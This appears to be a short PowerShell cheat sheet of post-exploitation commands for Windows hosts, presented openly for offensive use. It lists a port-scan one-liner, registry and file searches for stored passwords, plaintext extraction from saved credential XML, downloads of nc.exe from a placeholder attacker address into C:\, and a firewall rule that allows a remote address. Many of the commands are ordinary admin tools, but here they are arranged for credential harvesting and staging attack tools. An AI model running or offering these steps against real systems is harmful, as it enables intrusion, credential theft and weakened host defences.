# Powershell

**Ping scan:**
```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<IP>", $_)) "Port
$_ is open!"} 2>$null
```


**Download remote files:**
```powershell
powershell "(New-Object System.Net.WebClient).DownloadFile("<IP+file>",
<Destination-File>)"
```


**Look for passwords:**
```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt *.bat *.ps1
# don't forget that this exists
ls -force
```

**Specific string search:**
```powershell
ls -r C:\PATH -file | {Select-String -path $_ -pattern <SEARCH TERM>}
```

**Credentials:**
```powershell
# Import credentials from a xml powershell file
$creds = Import-CliXml -Path C:\Users\file.txt
$creds.GetNetworkCredential().Password

# it is also possible to grab the current user's credential with
Get-Credential
# or for a specific user
Get-Credential -credential $user
```

Get-Credential returns an object for which there is a good
[documentation](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-credential?view=powershell-7).

However, it might not run if you are not the user you try to get credential for.

**Send remote files to host:**
```powershell
Invoke-Webrequest -Uri <IP> -OutFile <DestFile>

# Win 7
(New-Object System.Net.WebClient).DownloadFile("http://<IP>/nc.exe", "c:\nc.exe")

# Win 8 and later
wget "http://<IP>/nc.exe" -outfile "c:\nc.exe"
```

**Firewall:**
```powershell
# Get Firewall rules
Get-NetFirewallRule -all | Out-GridView
Get-NetFirewallRule -all | Export-csv <file.csv>

# Add a Firewall rule
New-NetFirewallRule -Action Allow -DisplayName <NAME> -RemoteAddress <IP>
```
